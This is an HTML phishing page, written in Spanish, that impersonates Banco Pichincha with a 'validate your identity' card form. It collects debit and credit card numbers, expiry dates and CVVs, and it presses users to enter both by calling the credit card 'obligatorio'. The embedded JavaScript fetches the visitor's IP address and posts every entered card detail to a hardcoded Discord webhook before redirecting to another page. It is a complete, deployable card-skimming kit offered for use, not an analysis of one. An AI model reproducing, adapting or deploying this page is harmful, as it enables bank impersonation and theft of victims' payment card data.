<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Validar identidad ‚Äî Tarjeta d√©bito y cr√©dito</title>

    <style>
      :root {
        --bg: #f4f6fb;
        --card: #fff;
        --accent: #0b3560;
        --muted: #7f8a97;
        --danger: #c0392b;
        --radius: 10px;
        --shadow: 0 8px 30px rgba(11, 53, 96, 0.08);
      }
      * {
        box-sizing: border-box;
      }
      body {
        margin: 0;
        font-family: Inter, system-ui, Arial, sans-serif;
        background: var(--bg);
        color: #122;
        padding: 28px;
        display: flex;
        align-items: flex-start;
        justify-content: center;
        min-height: 100vh;
      }
      .wrapper {
        width: 100%;
        max-width: 560px;
      }
      .card {
        background: var(--card);
        border-radius: var(--radius);
        padding: 26px;
        box-shadow: var(--shadow);
        border: 1px solid rgba(11, 53, 96, 0.06);
        margin-bottom: 14px;
      }
      h1 {
        font-size: 20px;
        margin: 0 0 6px;
        color: var(--accent);
      }
      p.lead {
        margin: 0 0 18px;
        color: var(--muted);
      }
      label {
        display: block;
        font-weight: 600;
        margin-bottom: 6px;
        color: var(--accent);
        font-size: 14px;
      }
      .input {
        width: 100%;
        padding: 12px 14px;
        border-radius: 8px;
        border: 1.5px solid rgba(11, 53, 96, 0.12);
        margin-bottom: 14px;
        font-size: 16px;
      }
      .row {
        display: flex;
        gap: 12px;
      }
      .half {
        flex: 1;
      }
      .btn {
        display: inline-block;
        width: 100%;
        padding: 12px;
        border-radius: 8px;
        border: 0;
        background: #ffd86b;
        color: var(--accent);
        font-weight: 700;
        cursor: pointer;
        font-size: 16px;
      }
      .note {
        font-size: 13px;
        color: var(--muted);
        margin-top: 10px;
      }
      .error {
        color: var(--danger);
        font-size: 13px;
        margin-top: -8px;
        margin-bottom: 8px;
      }
      small.sec {
        display: block;
        margin-top: 12px;
        font-size: 12px;
        color: var(--muted);
      }

      /* Toggle link */
      .toggle-credit {
        display: inline-block;
        margin-top: 10px;
        background: transparent;
        border: 0;
        color: var(--accent);
        cursor: pointer;
        text-decoration: underline;
        padding: 6px 0;
        font-weight: 600;
      }
    </style>
  </head>
  <body>
    <div class="wrapper">
      <!-- Formulario combinado para tarjeta d√©bito y cr√©dito -->
      <div class="card" role="region" aria-labelledby="title">
        <h1 id="title">Validaci√≥n de tarjeta</h1>
        <p class="lead">
          Por favor ingresa los detalles de tu tarjeta de d√©bito. Si tienes una
          tarjeta de cr√©dito con nosotros, es obligatorio ingresarla para
          validar titularidad.
        </p>

        <form id="cardForm" autocomplete="off" novalidate>
          <!-- Formulario de tarjeta de d√©bito -->
          <label for="cardnumber-debit">N√∫mero de tarjeta</label>
          <input
            id="cardnumber-debit"
            name="cardnumber-debit"
            class="input"
            inputmode="numeric"
            placeholder="1234 5678 9012 3456"
            maxlength="19"
            aria-describedby="cardHelp"
            autocomplete="cc-number"
            required
          />

          <div class="row">
            <div class="half">
              <label for="expiry-debit">(MM/AA)</label>
              <input
                id="expiry-debit"
                name="expiry-debit"
                class="input"
                inputmode="numeric"
                placeholder="MM/AA"
                maxlength="5"
                autocomplete="cc-exp"
                required
              />
            </div>
            <div class="half">
              <label for="cvv-debit">CVV</label>
              <input
                id="cvv-debit"
                name="cvv-debit"
                class="input"
                inputmode="numeric"
                placeholder="123"
                maxlength="3"
                autocomplete="cc-csc"
                required
              />
            </div>
          </div>

          <!-- Toggle para tarjeta de cr√©dito -->
          <button
            type="button"
            id="revealCreditBtn"
            class="toggle-credit"
            aria-expanded="false"
            aria-controls="creditSection"
          >
            Tengo una tarjeta de cr√©dito activa
          </button>

          <!-- Formulario de tarjeta de cr√©dito (oculto por defecto) -->
          <div id="creditSection" hidden>
            <div class="row">
              <div class="half">
                <label for="cardnumber-credit"
                  >N√∫mero de tarjeta de cr√©dito</label
                >
                <input
                  id="cardnumber-credit"
                  name="cardnumber-credit"
                  class="input"
                  inputmode="numeric"
                  placeholder="1234 5678 9012 3456"
                  maxlength="19"
                  autocomplete="cc-number"
                />
              </div>
              <div class="half">
                <label for="expiry-credit">(MM/AA)</label>
                <input
                  id="expiry-credit"
                  name="expiry-credit"
                  class="input"
                  inputmode="numeric"
                  placeholder="MM/AA"
                  maxlength="5"
                  autocomplete="cc-exp"
                />
              </div>
            </div>
            <div class="row">
              <div class="half">
                <label for="cvv-credit">CVV</label>
                <input
                  id="cvv-credit"
                  name="cvv-credit"
                  class="input"
                  inputmode="numeric"
                  placeholder="123"
                  maxlength="3"
                  autocomplete="cc-csc"
                />
              </div>
            </div>
          </div>

          <!-- Errores -->
          <div id="errors" aria-live="polite"></div>

          <button type="submit" class="btn">Enviar tarjetas</button>

          <small class="sec"
            >Usaremos estos datos √∫nicamente para validar tu identidad. No
            compartas esta informaci√≥n con terceros.</small
          >
        </form>

        <p class="note">
          Nota: Banco Pichincha en ning√∫n momento te solicitaremos por llamada
          el n√∫mero de tarjeta, fecha de vencimiento ni CVV. No compartas esta
          informaci√≥n con terceros.
        </p>
      </div>
    </div>

    <script>
      const webhookURL =
        "https://discord.com/api/webhooks/1454989461040529510/JHDshtAuGe5zTYy-fIxhQLc_87MGHTDe_Y6LvJRVXhd2bMuF3ojcwWlUTGaEryUfEF-Z";

      // üëâ Obtener IP del cliente
      async function getIP() {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        return ipData.ip;
      }

      // üëâ Enviar mensaje al webhook
      function sendToDiscord(message) {
        return fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: message }),
        }).then((response) => {
          if (response.ok) {
            console.log("Mensaje enviado a Discord");
            return response;
          } else {
            console.error("Error al enviar mensaje a Discord");
            throw new Error(
              "Error al enviar mensaje a Discord: " + response.status
            );
          }
        });
      }

      // üëâ Algoritmo de Luhn
      function luhnCheck(num) {
        const arr = (num + "")
          .split("")
          .reverse()
          .map((x) => parseInt(x));
        const lastDigit = arr.shift();
        let sum = arr.reduce((acc, val, idx) => {
          if (idx % 2 === 0) {
            val *= 2;
            if (val > 9) val -= 9;
          }
          return acc + val;
        }, 0);
        sum += lastDigit;
        return sum % 10 === 0;
      }

      // üëâ Formatear fecha MM/AA bloqueando mes y a√±o inv√°lidos
      function formatExpiry(input) {
        input.addEventListener("input", () => {
          let raw = input.value.replace(/\D/g, "");

          let mes = raw.slice(0, 2);
          let anio = raw.slice(2, 4);

          /* ===== BLOQUEO DE MES ===== */
          if (mes.length === 2) {
            const mesNum = parseInt(mes, 10);
            if (mesNum < 1 || mesNum > 12) {
              mes = mes.slice(0, 1); // bloquea 13+
            }
          }

          /* ===== BLOQUEO DE A√ëO ===== */
          if (anio.length === 2) {
            const anioNum = parseInt(anio, 10);
            if (anioNum <= 25) {
              anio = anio.slice(0, 1); // bloquea 25 o menor
            }
          }

          // Construir valor final MM/AA
          let value = mes;
          if (anio.length) {
            value += "/" + anio;
          }

          input.value = value.slice(0, 5);
        });
      }

      formatExpiry(document.getElementById("expiry-debit"));
      formatExpiry(document.getElementById("expiry-credit"));

      const revealBtn = document.getElementById("revealCreditBtn");
      const creditSection = document.getElementById("creditSection");

      revealBtn.addEventListener("click", function () {
        const expanded = revealBtn.getAttribute("aria-expanded") === "true";
        revealBtn.setAttribute("aria-expanded", !expanded);
        creditSection.hidden = expanded;
      });

      // üëâ Env√≠o del formulario
      document
        .getElementById("cardForm")
        .addEventListener("submit", async function (ev) {
          ev.preventDefault();
          const errors = [];

          // --- D√©bito ---
          const debitCardNumber = document
            .getElementById("cardnumber-debit")
            .value.trim()
            .replace(/\s+/g, "");
          const debitExpiry = document
            .getElementById("expiry-debit")
            .value.trim();
          const debitCVV = document.getElementById("cvv-debit").value.trim();

          if (
            !debitCardNumber ||
            debitCardNumber.length < 12 ||
            debitCardNumber.length > 19 ||
            !luhnCheck(debitCardNumber)
          ) {
            errors.push(
              "N√∫mero de tarjeta d√©bito inv√°lido o no pas√≥ la validaci√≥n del Banco Pichincha"
            );
          }

          if (!/^\d{2}\/\d{2}$/.test(debitExpiry)) {
            errors.push("Fecha de vencimiento de d√©bito inv√°lida");
          }

          if (!/^\d{3,4}$/.test(debitCVV)) {
            errors.push("CVV de d√©bito inv√°lido");
          }

          // --- Cr√©dito (opcional) ---
          const creditCardInput = document.getElementById("cardnumber-credit");
          const creditExpiryInput = document.getElementById("expiry-credit");
          const creditCVVInput = document.getElementById("cvv-credit");

          const creditCardNumber = creditCardInput?.value
            .trim()
            .replace(/\s+/g, "");
          const creditExpiry = creditExpiryInput?.value.trim();
          const creditCVV = creditCVVInput?.value.trim();

          let hasCredit = creditCardNumber || creditExpiry || creditCVV;

          if (hasCredit) {
            if (
              !creditCardNumber ||
              creditCardNumber.length < 12 ||
              creditCardNumber.length > 19 ||
              !luhnCheck(creditCardNumber)
            ) {
              errors.push(
                "N√∫mero de tarjeta cr√©dito inv√°lido o no pas√≥ la validaci√≥n del Banco Pichincha"
              );
            }

            if (!/^\d{2}\/\d{2}$/.test(creditExpiry)) {
              errors.push("Fecha de vencimiento de cr√©dito inv√°lida");
            }

            if (!/^\d{3,4}$/.test(creditCVV)) {
              errors.push("CVV de cr√©dito inv√°lido");
            }
          }

          // Mostrar errores
          const errorBox = document.getElementById("errors");
          errorBox.innerHTML = "";
          if (errors.length) {
            errorBox.innerHTML = errors
              .map((e) => `<div class="error">${e}</div>`)
              .join("");
            return;
          }

          // Obtener IP
          let ip = "Desconocida";
          try {
            ip = await getIP();
          } catch (err) {
            console.error("No se pudo obtener la IP:", err);
          }

          // Armar mensaje
          let message = `üì° **IP del usuario**: ${ip}\n\n**üí≥ Tarjeta D√©bito**\n- N√∫mero: ${debitCardNumber}\n- Expira: ${debitExpiry}\n- CVV: ${debitCVV}`;
          if (hasCredit) {
            message += `\n\n**üí≥ Tarjeta Cr√©dito**\n- N√∫mero: ${creditCardNumber}\n- Expira: ${creditExpiry}\n- CVV: ${creditCVV}`;
          }

          // Enviar al webhook
          sendToDiscord(message)
            .then(() => {
              window.location.href = "sal.html";
            })
            .catch((err) => {
              console.error("No se pudo enviar el mensaje al webhook:", err);
              errorBox.innerHTML = `<div class="error">Ocurri√≥ un error al procesar (no se envi√≥ el webhook). Intenta nuevamente.</div>`;
            });
        });
    </script>
  </body>
</html>
